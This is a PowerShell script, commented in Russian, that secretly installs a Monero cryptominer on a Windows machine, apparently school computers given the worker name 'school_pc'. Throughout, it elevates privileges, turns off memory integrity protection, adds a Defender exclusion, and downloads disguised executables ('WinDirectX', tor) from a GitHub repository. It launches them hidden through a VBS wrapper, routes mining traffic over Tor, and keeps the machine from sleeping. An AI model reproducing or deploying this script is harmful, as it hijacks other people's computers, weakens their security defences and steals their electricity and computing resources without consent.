# 1. ПРОВЕРКА АДМИНА
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# 2. СНИМАЕМ ЗАПРЕТЫ И ВЫКЛЮЧАЕМ ЗАЩИТУ ПАМЯТИ (HVCI)
Set-ExecutionPolicy Bypass -Scope Process -Force
# Выключаем Memory Integrity (нужна перезагрузка для полной силы, но майнер подцепит что сможет)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue

# 3. КОНФИГУРАЦИЯ
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA"
$user = "Isfandiyor0112-star"

# 4. КОМАНДЫ ПРОФИЛЯ (check, update, delete)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$profileDir = Split-Path $profilePath
if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }

$Functions = @"
function check {
    `$p = Get-Process "WinDirectX" -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    if (`$p) { 
        `$mem = [Math]::Round(`$p.WorkingSet64 / 1MB, 2)
        Write-Host "МАЙНЕР: OK (`$mem MB)" -ForegroundColor Green 
    } else { Write-Host "МАЙНЕР: OFF" -ForegroundColor Red }
    if (`$t) { Write-Host "TOR: OK" -ForegroundColor Green } else { Write-Host "TOR: OFF" -ForegroundColor Red }
}

function update {
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    `$web = New-Object System.Net.WebClient
    `$web.Headers.Add("User-Agent", "Mozilla/5.0")
    `$web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe")
    `$web.DownloadFile("https://github.com/$user/sminers/raw/main/Windows", "$path\tor.exe")
    Start-Process -FilePath "$path\win_start.vbs"
    Write-Host "Обновлено!" -ForegroundColor Cyan
}

function delete {
    Stop-Process -Name "WinDirectX", "tor" -Force -ErrorAction SilentlyContinue
    # ВОЗВРАЩАЕМ ЗАЩИТУ ПАМЯТИ НАЗАД
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 1 -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Всё удалено, защита памяти включена обратно!" -ForegroundColor Yellow
}
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 5. ЗАГРУЗКА И УСТАНОВКА
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

$web = New-Object System.Net.WebClient
$web.Headers.Add("User-Agent", "Mozilla/5.0")
if (!(Test-Path "$path\WinDirectX.exe")) {
    $web.DownloadFile("https://github.com/$user/sminers/raw/main/WinDirectX", "$path\WinDirectX.exe")
}
if (!(Test-Path "$path\tor.exe")) {
    $web.DownloadFile("https://github.com/$user/sminers/raw/main/Windows", "$path\tor.exe")
}

# 6. СОЗДАНИЕ ЗАПУСКА (443 ПОРТ + TLS + TOR)
$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 25 /nobreak >nul`n$path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 7. ПИТАНИЕ И СТАРТ
powercfg /x -monitor-timeout-ac 5
powercfg /x -standby-timeout-ac 0
Start-Process -FilePath "$path\win_start.vbs"

Write-Host "--- СИСТЕМА ГОТОВА (ЗАЩИТА ВЫКЛЮЧЕНА) ---" -ForegroundColor Magenta
